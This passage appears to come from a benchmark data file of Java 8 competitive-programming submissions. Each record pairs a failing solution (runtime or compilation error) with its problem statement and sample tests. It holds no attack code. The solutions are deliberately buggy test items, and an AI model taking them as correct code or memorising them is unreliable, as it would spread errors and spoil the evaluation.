{"difficulty":1200,"lang":"Java 8","lang_cluster":"java","src_uid":"1a22bc82ddf6b3dfbf270bc5e3294c28","submission_id":"re_918","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/* THE BLIND CODER  *\/\nimport java.util.Scanner;\npublic class fr\n{\n     public static void main(String v[])\n     {\n          Scanner in =new Scanner(System.in);\n          \/*\n\t\t\t\t\t\t\t\t\t\t\t\tDOMINGO_GIRL :)\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u258c\u2592\u2588\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\u2580\u2592\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u258c\u2592\u2592\u2580\u2584\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\u2580\u2592\u2592\u2592\u2590\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2590\u2584\u2580\u2592\u2592\u2580\u2580\u2580\u2580\u2584\u2584\u2584\u2580\u2592\u2592\u2592\u2592\u2592\u2590\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2500\u2500\u2584\u2584\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2592\u2592\u2584\u2588\u2592\u2590\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2584\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2588\u2588\u2580\u2592\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2590\u2592\u2592\u2592\u2584\u2584\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2584\u2592\u2592\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u258c\u2592\u2592\u2590\u2584\u2588\u2580\u2592\u2592\u2592\u2592\u2584\u2580\u2588\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2592\u2590\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u258c\u2588\u2588\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2584\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u258c\u2592\u2580\u2584\u2588\u2588\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u258c\u2580\u2590\u2584\u2588\u2584\u2588\u258c\u2584\u2592\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2590 Wow\n\t\t\t\t\t\t\t\t\t\t\t\u2590\u2592\u2580\u2590\u2580\u2590\u2580\u2592\u2592\u2584\u2584\u2592\u2584\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2590\u2592\u2592\u2592\u2580\u2580\u2584\u2584\u2592\u2592\u2592\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2590\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u258c\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2580\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2590\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2580\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2584\u2592\u2592\u2592\u2592\u258c\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2500\u2580\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2584\u2584\u2584\u2580\u2592\u2592\u2592\u2592\u2584\u2580\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2500\u2590\u2580\u2592\u2580\u2584\u2584\u2584\u2584\u2584\u2584\u2580\u2580\u2580\u2592\u2592\u2592\u2592\u2592\u2584\u2584\u2580\n\t\t\t\t\t\t\t\t\t\t\t\u2500\u2500\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2580\n\n\n\t\t\t\t\t\t\t\t\t\t\t*\/\n    int n=in.nextInt();\n   \n    int[] a=new int[n+5];\n    int sum=0;\n    for(int i=0;i<n;i++)\n    {\n       a[i]=in.nextInt();\n    sum+=a[i];   \n    }\n    int p=0,ct=0;\n    p=sum\/n;\n    for(int i=0;i<n;i++)\n    {\n        if(p==a[i])\n        ct++;\n    }\n    System.out.println(ct);\n    for(int i=0;i<n;i++)\n    {\n        if(p==a[i])\n          System.out.print((i+1)+\" \");\n    }\n    \n  \n}\n}\n\n\t\t\t\n\n\n     ","description":"You are given a sequence of positive integers a1,\u2009a2,\u2009...,\u2009an. Find all such indices i, that the i-th element equals the arithmetic mean of all other elements (that is all elements except for this one).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the integer n (2\u2009\u2264\u2009n\u2009\u2264\u20092\u00b7105). The second line contains elements of the sequence a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). All the elements are positive integers.","output_spec":"Print on the first line the number of the sought indices. Print on the second line the sought indices in the increasing order. All indices are integers from 1 to n. If the sought elements do not exist, then the first output line should contain number 0. In this case you may either not print the second line or print an empty line.","notes":null,"sample_inputs":["5\n1 2 3 4 5","4\n50 50 50 50"],"sample_outputs":["1\n3","4\n1 2 3 4"]}
{"difficulty":1200,"lang":"Java 8","lang_cluster":"java","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_834","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.util.Arrays;\nimport java.io.BufferedWriter;\nimport java.util.InputMismatchException;\nimport java.io.OutputStream;\nimport java.io.PrintWriter;\nimport java.util.NoSuchElementException;\nimport java.io.Writer;\nimport java.math.BigInteger;\nimport java.io.InputStream;\n\n\/**\n * Built using CHelper plug-in\n * Actual solution is at the top\n * @author walker\n *\/\npublic class Main {\n\tpublic static void main(String[] args) {\n\t\tInputStream inputStream = System.in;\n\t\tOutputStream outputStream = System.out;\n\t\tInputReader in = new InputReader(inputStream);\n\t\tPrintWriter out = new PrintWriter(outputStream);\n\t\tTaskD solver = new TaskD();\n\t\tsolver.solve(1, in, out);\n\t\tout.close();\n\t}\n}\n\nclass TaskD {\n    public void solve(int testNumber, InputReader in, PrintWriter out) {\n        int n = in.readInt();\n        int[] points = IOUtils.readIntArray(in, n);\n        IntPair[] prizes = new IntPair[5];\n        int[] counts = new int[5];\n        for(int i = 0; i < 5; i++){\n            prizes[i] = new IntPair(in.readInt(), i);\n        }\n        Arrays.sort(prizes);\n        int i = 0;\n        long p = 0;\n        while(i < n){\n            while(p < prizes[0].first && i < n){\n                p += points[i++];\n            }\n            if(p >= prizes[0].first){\n                int j = 0;\n                while(j < 5 && p >= prizes[j].first){j++;}\n                j--;\n                while(j >= 0 && p >= prizes[j].first){\n                    int c = (int) p \/ prizes[j].first;\n                    counts[prizes[j].second] += c;\n                    p -= c * prizes[j].first;\n                    j--;\n                }\n            }\n        }\n        if(p >= prizes[0].first){\n            int j = 0;\n            while(j < 5 && p >= prizes[j].first){j++;}\n            j--;\n            while(j >= 0 && p >= prizes[j].first){\n                int c = (int) p \/ prizes[j].first;\n                counts[prizes[j].second] += c;\n                p -= c * prizes[j].first;\n                j--;\n            }\n        }\n        for(int k = 0; k < counts.length; k++){\n            out.print(counts[k] + \" \");\n        }\n        out.println();\n        out.print(p);\n    }\n}\n\nclass InputReader {\n\n\tprivate InputStream stream;\n\tprivate byte[] buf = new byte[1024];\n\tprivate int curChar;\n\tprivate int numChars;\n\tprivate SpaceCharFilter filter;\n\n\tpublic InputReader(InputStream stream) {\n\t\tthis.stream = stream;\n\t}\n\n\tpublic int read() {\n\t\tif (numChars == -1)\n\t\t\tthrow new InputMismatchException();\n\t\tif (curChar >= numChars) {\n\t\t\tcurChar = 0;\n\t\t\ttry {\n\t\t\t\tnumChars = stream.read(buf);\n\t\t\t} catch (IOException e) {\n\t\t\t\tthrow new InputMismatchException();\n\t\t\t}\n\t\t\tif (numChars <= 0)\n\t\t\t\treturn -1;\n\t\t}\n\t\treturn buf[curChar++];\n\t}\n\n\tpublic int readInt() {\n\t\tint c = read();\n\t\twhile (isSpaceChar(c))\n\t\t\tc = read();\n\t\tint sgn = 1;\n\t\tif (c == '-') {\n\t\t\tsgn = -1;\n\t\t\tc = read();\n\t\t}\n\t\tint res = 0;\n\t\tdo {\n\t\t\tif (c < '0' || c > '9')\n\t\t\t\tthrow new InputMismatchException();\n\t\t\tres *= 10;\n\t\t\tres += c - '0';\n\t\t\tc = read();\n\t\t} while (!isSpaceChar(c));\n\t\treturn res * sgn;\n\t}\n\n\tpublic boolean isSpaceChar(int c) {\n\t\tif (filter != null)\n\t\t\treturn filter.isSpaceChar(c);\n\t\treturn isWhitespace(c);\n\t}\n\n\tpublic static boolean isWhitespace(int c) {\n\t\treturn c == ' ' || c == '\\n' || c == '\\r' || c == '\\t' || c == -1;\n\t}\n\n\tpublic interface SpaceCharFilter {\n\t\tpublic boolean isSpaceChar(int ch);\n\t}\n}\n\nclass IOUtils {\n\n\tpublic static int[] readIntArray(InputReader in, int size) {\n\t\tint[] array = new int[size];\n\t\tfor (int i = 0; i < size; i++)\n\t\t\tarray[i] = in.readInt();\n\t\treturn array;\n\t}\n\n}\n\nclass IntPair implements Comparable<IntPair> {\n\tpublic final int first, second;\n\n\tpublic IntPair(int first, int second) {\n\t\tthis.first = first;\n\t\tthis.second = second;\n\t}\n\n\tpublic String toString() {\n\t\treturn \"(\" + first + \",\" + second + \")\";\n\t}\n\n\tpublic boolean equals(Object o) {\n\t\tif (this == o) return true;\n\t\tif (o == null || getClass() != o.getClass()) return false;\n\n\t\tIntPair intPair = (IntPair) o;\n\n\t\treturn first == intPair.first && second == intPair.second;\n\n\t}\n\n\tpublic int hashCode() {\n\t\tint result = first;\n\t\tresult = 31 * result + second;\n\t\treturn result;\n\t}\n\n\tpublic int compareTo(IntPair o) {\n\t\tif (first < o.first)\n\t\t\treturn -1;\n\t\tif (first > o.first)\n\t\t\treturn 1;\n\t\tif (second < o.second)\n\t\t\treturn -1;\n\t\tif (second > o.second)\n\t\t\treturn 1;\n\t\treturn 0;\n\t}\n}\n\n","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1300,"lang":"Java 8","lang_cluster":"java","src_uid":"30c4f155336cf762699a1bbc55a60d27","submission_id":"re_594","tags":["implementation"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.util.Scanner;\npublic class Ishu\n{\n    public static void main(String[] args)\n    {\n        Scanner scan=new Scanner(System.in);\n        int n,m,i,j,sum;\n        boolean flag=true; \n        int[][] a=new int[100][2];\n        n=scan.nextInt();\n        m=scan.nextInt();\n        for(i=0;i<m;++i)\n        {\n            a[i][0]=scan.nextInt();\n            a[i][1]=scan.nextInt(); \n        }\n        for(i=1;i<=n;++i)\n        {\n            sum=0;\n            for(j=0;j<m;++j)\n                if(i>=a[j][0]&&i<=a[j][1])\n                     ++sum;\n            if(!(sum==1))\n            {\n                flag=false;\n                break; \n            }\n        }\n        if(flag)\n            System.out.println(\"OK\");\n        else\n            System.out.println(i+\" \"+sum); \n    }\n}","description":"School holidays come in Berland. The holidays are going to continue for n days. The students of school \u2116N are having the time of their lives and the IT teacher Marina Sergeyevna, who has spent all the summer busy checking the BSE (Berland State Examination) results, has finally taken a vacation break! Some people are in charge of the daily watering of flowers in shifts according to the schedule. However when Marina Sergeyevna was making the schedule, she was so tired from work and so lost in dreams of the oncoming vacation that she perhaps made several mistakes. In fact, it is possible that according to the schedule, on some days during the holidays the flowers will not be watered or will be watered multiple times. Help Marina Sergeyevna to find a mistake.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two numbers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100) \u2014 the number of days in Berland holidays and the number of people in charge of the watering respectively. The next m lines contain the description of the duty schedule. Each line contains two integers ai and bi (1\u2009\u2264\u2009ai\u2009\u2264\u2009bi\u2009\u2264\u2009n), meaning that the i-th person in charge should water the flowers from the ai-th to the bi-th day inclusively, once a day. The duty shifts are described sequentially, i.e. bi\u2009\u2264\u2009ai\u2009+\u20091 for all i from 1 to n\u2009-\u20091 inclusively. ","output_spec":"Print \"OK\" (without quotes), if the schedule does not contain mistakes. Otherwise you have to find the minimal number of a day when the flowers will not be watered or will be watered multiple times, and output two integers \u2014 the day number and the number of times the flowers will be watered that day.","notes":"NoteKeep in mind that in the second sample the mistake occurs not only on the second day, but also on the sixth day, when nobody waters the flowers. However, you have to print the second day, i.e. the day with the minimal number.","sample_inputs":["10 5\n1 2\n3 3\n4 6\n7 7\n8 10","10 5\n1 2\n2 3\n4 5\n7 8\n9 10","10 5\n1 2\n3 3\n5 7\n7 7\n7 10"],"sample_outputs":["OK","2 2","4 0"]}
{"difficulty":1300,"lang":"Java 8","lang_cluster":"java","src_uid":"378a9ab7ad891d60f23645106d24f314","submission_id":"re_250","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*;\npublic class A{\n\n    public static void main(String args[])\n    {\n        Scanner sc=new Scanner(System.in);\n        int n=sc.nextInt();\n        int mapping[]=new int[9];\n        String actual=sc.next();\n        String answer=\"\";\n        for(int i=0;i<9;i++)\n        {\n            mapping[i]=sc.nextInt();\n        }\n    \tboolean change=false;\n        for(int i=0;i<n;i++)\n        {\n        \tint temp=Integer.parseInt(actual.charAt(i)+\"\");\n    \/\/ \t\tif(mapping[temp-1]==temp)\n    \/\/ \t\t\tcontinue;\n    \/\/     \tif(mapping[temp-1]<temp)\n    \/\/     \t\tif(!change)\n    \/\/     \t\t\tcontinue;\n    \/\/     \t\telse\n    \/\/     \t\t\tbreak;\n    \/\/     \telse\n    \/\/     \t{\n    \/\/     \t\tactual=actual.substring(0,i)+mapping[temp-1]+actual.substring(i+1);\n    \/\/     \t\tchange=true;\n    \/\/     \t}\n    \t\tif(mapping[temp-1]==temp)\n    \t\t\tanswer=answer+mapping[temp-1]+\"\";\n        \telse if(mapping[temp-1]<temp)\n        \t{\n        \t\tif(!change)\n        \t\t{\n        \t\t\tanswer=answer+actual.charAt(i)+\"\";\n        \t\t}\n        \t\telse\n        \t\t{\n        \t\t    answer=answer+actual.substring(i);\n        \t\t\tbreak;\n        \t\t}\n        \t}\n        \telse\n        \t{   \n        \t    answer=answer+mapping[temp-1]+\"\";\n        \t\tchange=true;\n        \t}\n        }\n        System.out.println(answer);\n        \n    }\n\n}","description":"You are given a long decimal number $$$a$$$ consisting of $$$n$$$ digits from $$$1$$$ to $$$9$$$. You also have a function $$$f$$$ that maps every digit from $$$1$$$ to $$$9$$$ to some (possibly the same) digit from $$$1$$$ to $$$9$$$.You can perform the following operation no more than once: choose a non-empty contiguous subsegment of digits in $$$a$$$, and replace each digit $$$x$$$ from this segment with $$$f(x)$$$. For example, if $$$a = 1337$$$, $$$f(1) = 1$$$, $$$f(3) = 5$$$, $$$f(7) = 3$$$, and you choose the segment consisting of three rightmost digits, you get $$$1553$$$ as the result.What is the maximum possible number you can obtain applying this operation no more than once?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^5$$$) \u2014 the number of digits in $$$a$$$. The second line contains a string of $$$n$$$ characters, denoting the number $$$a$$$. Each character is a decimal digit from $$$1$$$ to $$$9$$$. The third line contains exactly $$$9$$$ integers $$$f(1)$$$, $$$f(2)$$$, ..., $$$f(9)$$$ ($$$1 \\le f(i) \\le 9$$$).","output_spec":"Print the maximum number you can get after applying the operation described in the statement no more than once.","notes":null,"sample_inputs":["4\n1337\n1 2 5 4 6 6 3 1 9","5\n11111\n9 8 7 6 5 4 3 2 1","2\n33\n1 1 1 1 1 1 1 1 1"],"sample_outputs":["1557","99999","33"]}
{"difficulty":1400,"lang":"Java 8","lang_cluster":"java","src_uid":"3d4df21eebf32ce15841179bb85e6f2f","submission_id":"re_51","tags":["sortings","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.OutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.util.HashSet;\nimport java.util.Arrays;\nimport java.util.InputMismatchException;\nimport java.io.IOException;\nimport java.io.InputStream;\n\n\/**\n * Built using CHelper plug-in\n * Actual solution is at the top\n *\n * @author caoash\n *\/\npublic class Main {\n    public static void main(String[] args) {\n        InputStream inputStream = System.in;\n        OutputStream outputStream = System.out;\n        FastScanner in = new FastScanner(inputStream);\n        PrintWriter out = new PrintWriter(outputStream);\n        BArrayKColoring solver = new BArrayKColoring();\n        solver.solve(1, in, out);\n        out.close();\n    }\n\n    static class BArrayKColoring {\n        public void solve(int testNumber, FastScanner br, PrintWriter pw) {\n            int n = br.nextInt();\n            int k = br.nextInt();\n            int[] a = br.nextIntArray(n);\n            HashSet<Pair> set = new HashSet<Pair>();\n            int[] fin = new int[n];\n            boolean[][] used = new boolean[5000][5000];\n            Arrays.fill(fin, -1);\n            for (int i = 0; i < n; i++) {\n                int c = a[i];\n                for (int j = 1; j <= k; j++) {\n                    if (!used[j][c]) {\n                        fin[i] = j;\n                        used[j][c] = true;\n                        break;\n                    }\n                }\n            }\n            for (int i = 0; i < n; i++) {\n                if (fin[i] == -1) {\n                    pw.println(\"NO\");\n                    pw.close();\n                    return;\n                }\n            }\n            pw.println(\"YES\");\n            for (int i = 0; i < n; i++) {\n                pw.print(fin[i] + \" \");\n            }\n            pw.close();\n        }\n\n    }\n\n    static class Pair implements Comparable<Pair> {\n        int f;\n        int s;\n\n        public Pair(int f, int s) {\n            this.f = f;\n            this.s = s;\n        }\n\n        public int compareTo(Pair p) {\n            return this.f == p.f ? this.s - p.s : this.f - p.f;\n        }\n\n        public String toString() {\n            return \"(\" + f + \",\" + s + \")\";\n        }\n\n    }\n\n    static class FastScanner {\n        private InputStream stream;\n        private byte[] buf = new byte[1024];\n        private int curChar;\n        private int numChars;\n        private FastScanner.SpaceCharFilter filter;\n\n        public FastScanner(InputStream stream) {\n            this.stream = stream;\n        }\n\n        public int read() {\n            if (numChars == -1) {\n                throw new InputMismatchException();\n            }\n            if (curChar >= numChars) {\n                curChar = 0;\n                try {\n                    numChars = stream.read(buf);\n                } catch (IOException e) {\n                    throw new InputMismatchException();\n                }\n                if (numChars <= 0) {\n                    return -1;\n                }\n            }\n            return buf[curChar++];\n        }\n\n        public int nextInt() {\n            int c = read();\n            while (isSpaceChar(c)) {\n                c = read();\n            }\n            int sgn = 1;\n            if (c == '-') {\n                sgn = -1;\n                c = read();\n            }\n            int res = 0;\n            do {\n                if (c < '0' || c > '9') {\n                    throw new InputMismatchException();\n                }\n                res *= 10;\n                res += c - '0';\n                c = read();\n            } while (!isSpaceChar(c));\n            return res * sgn;\n        }\n\n        public boolean isSpaceChar(int c) {\n            if (filter != null) {\n                return filter.isSpaceChar(c);\n            }\n            return isWhitespace(c);\n        }\n\n        public static boolean isWhitespace(int c) {\n            return c == ' ' || c == '\\n' || c == '\\r' || c == '\\t' || c == -1;\n        }\n\n        public int[] nextIntArray(int n) {\n            int[] array = new int[n];\n            for (int i = 0; i < n; ++i) array[i] = nextInt();\n            return array;\n        }\n\n        public interface SpaceCharFilter {\n            public boolean isSpaceChar(int ch);\n\n        }\n\n    }\n}\n\n","description":"You are given an array $$$a$$$ consisting of $$$n$$$ integer numbers.You have to color this array in $$$k$$$ colors in such a way that:   Each element of the array should be colored in some color;  For each $$$i$$$ from $$$1$$$ to $$$k$$$ there should be at least one element colored in the $$$i$$$-th color in the array;  For each $$$i$$$ from $$$1$$$ to $$$k$$$ all elements colored in the $$$i$$$-th color should be distinct. Obviously, such coloring might be impossible. In this case, print \"NO\". Otherwise print \"YES\" and any coloring (i.e. numbers $$$c_1, c_2, \\dots c_n$$$, where $$$1 \\le c_i \\le k$$$ and $$$c_i$$$ is the color of the $$$i$$$-th element of the given array) satisfying the conditions above. If there are multiple answers, you can print any.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\le k \\le n \\le 5000$$$) \u2014 the length of the array $$$a$$$ and the number of colors, respectively. The second line of the input contains $$$n$$$ integers $$$a_1, a_2, \\dots, a_n$$$ ($$$1 \\le a_i \\le 5000$$$) \u2014 elements of the array $$$a$$$.","output_spec":"If there is no answer, print \"NO\". Otherwise print \"YES\" and any coloring (i.e. numbers $$$c_1, c_2, \\dots c_n$$$, where $$$1 \\le c_i \\le k$$$ and $$$c_i$$$ is the color of the $$$i$$$-th element of the given array) satisfying the conditions described in the problem statement. If there are multiple answers, you can print any.","notes":"NoteIn the first example the answer $$$2~ 1~ 2~ 1$$$ is also acceptable.In the second example the answer $$$1~ 1~ 1~ 2~ 2$$$ is also acceptable.There exist other acceptable answers for both examples.","sample_inputs":["4 2\n1 2 2 3","5 2\n3 2 1 2 3","5 2\n2 1 1 2 1"],"sample_outputs":["YES\n1 1 2 2","YES\n2 1 1 2 1","NO"]}
{"difficulty":800,"lang":"Java 8","lang_cluster":"java","src_uid":"46d734178b3acaddf2ee3706f04d603d","submission_id":"re_668","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.util.Scanner;\n\npublic class A {\n    public static void solution(Scanner in, PrintWriter out) {\n        int[] cnt = new int[3];\n        for (int i = 0; i < 3; i++) {\n            String s = in.nextLine();\n            for (int j = 0; j < s.length(); j++) {\n                char c = s.charAt(j);\n                if (c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u')\n                    cnt[i]++;\n            }\n            if (cnt[0] == 5 && cnt[1] == 7 && cnt[2] == 5)\n                out.println(\"YES\");\n            else\n                out.println(\"NO\");\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        Scanner in = new Scanner(new BufferedReader(new InputStreamReader(\n                System.in)));\n        PrintWriter out = new PrintWriter(new BufferedWriter(\n                new OutputStreamWriter(System.out)));\n        solution(in, out);\n        in.close();\n        out.close();\n    }\n}\n","description":"Haiku is a genre of Japanese traditional poetry.A haiku poem consists of 17 syllables split into three phrases, containing 5, 7 and 5 syllables correspondingly (the first phrase should contain exactly 5 syllables, the second phrase should contain exactly 7 syllables, and the third phrase should contain exactly 5 syllables). A haiku masterpiece contains a description of a moment in those three phrases. Every word is important in a small poem, which is why haiku are rich with symbols. Each word has a special meaning, a special role. The main principle of haiku is to say much using a few words.To simplify the matter, in the given problem we will consider that the number of syllable in the phrase is equal to the number of vowel letters there. Only the following letters are regarded as vowel letters: \"a\", \"e\", \"i\", \"o\" and \"u\".Three phases from a certain poem are given. Determine whether it is haiku or not.","input_from":"standard input","output_to":"standard output","input_spec":"The input data consists of three lines. The length of each line is between 1 and 100, inclusive. The i-th line contains the i-th phrase of the poem. Each phrase consists of one or more words, which are separated by one or more spaces. A word is a non-empty sequence of lowercase Latin letters. Leading and\/or trailing spaces in phrases are allowed. Every phrase has at least one non-space character. See the example for clarification.","output_spec":"Print \"YES\" (without the quotes) if the poem is a haiku. Otherwise, print \"NO\" (also without the quotes).","notes":null,"sample_inputs":["on  codeforces \nbeta round is running\n   a rustling of keys","how many gallons\nof edo s rain did you drink\n                                cuckoo"],"sample_outputs":["YES","NO"]}
{"difficulty":1400,"lang":"Java 8","lang_cluster":"java","src_uid":"4d7de18e76600777ff023e1b61366ee4","submission_id":"re_608","tags":["sortings","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/package Mura;\n\/*****   BY MURAD   ******\/\nimport java.io.*;\nimport java.util.*;\nimport java.util.ArrayList;\nimport java.util.StringTokenizer;\n\npublic class Code {\n    public static long mod=998244353;\n    public static boolean isPowerOfTwo(int n)\n    {\n        if (n == 0)\n            return false;\n        while (n != 1)\n        {\n            if (n % 2 != 0)\n                return false;\n            n = n \/ 2;\n        }\n        return true;\n    }\n    public static long GCD(long x,long y){\n        if(y==0)\n            return x;\n        else\n            return GCD(y,x%y);\n    }\n    public static int max3( int a, int b, int c )\n    {\n        int x = a > b ? a : b;\n\n        return x > c ? x : c;\n\n    }\n    static class Graph {\n        private int v;\n        private ArrayList<Integer> adj[];\n        Graph(int vv) {\n            v = vv;\n            adj = new ArrayList[v];\n            for (int i = 0; i < v; ++i) {\n                adj[i] = new ArrayList<>();\n            }\n        }\n        void addEdge(int v, int w) {\n            adj[v].add(w);\n            adj[w].add(v);\n        }\n    }\n    public static void main(String[] args)throws IOException {\n        \/\/Solution ob=new Solution();\n        Scanner inp = new Scanner(System.in);\n        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n        StringTokenizer st = new StringTokenizer(br.readLine());\n        int n=Integer.parseInt(st.nextToken()),d=Integer.parseInt(st.nextToken());\n        Pair[]p=new Pair[n];\n        st=new StringTokenizer(br.readLine());\n        int aa=Integer.parseInt(st.nextToken()),bb=Integer.parseInt(st.nextToken());\n        int ans=0;\n        Queue<Integer>q=new LinkedList<>();\n        for(int i=0;i<n;i++)\n        {\n            st=new StringTokenizer(br.readLine());\n            int x=Integer.parseInt(st.nextToken()),y=Integer.parseInt(st.nextToken());\n            \/\/a[i]=x*aa+y*bb;\n            p[i]=new Pair(x*aa+y*bb,i+1);\n        }\n        Arrays.sort(p);\n        for(int i=0;i<p.length;i++)\n        {\n            if(p[i].value<=d){\n                ans++;\n                q.add(p[i].idx);\n                d-=p[i].value;\n            }\n        }\n        System.out.println(ans);\n        if(q.size()>0) {\n            while (!q.isEmpty()) {\n                int v = q.poll();\n                System.out.print(v + \" \");\n            }\n            return;\n        }\n        System.out.println(0);\n    }\n    static class InputReader {\n        public BufferedReader reader;\n        public StringTokenizer tokenizer;\n\n        public InputReader(InputStream stream) {\n            reader = new BufferedReader(new InputStreamReader(stream), 32768);\n            tokenizer = null;\n        }\n        public String next() {\n            while (tokenizer == null || 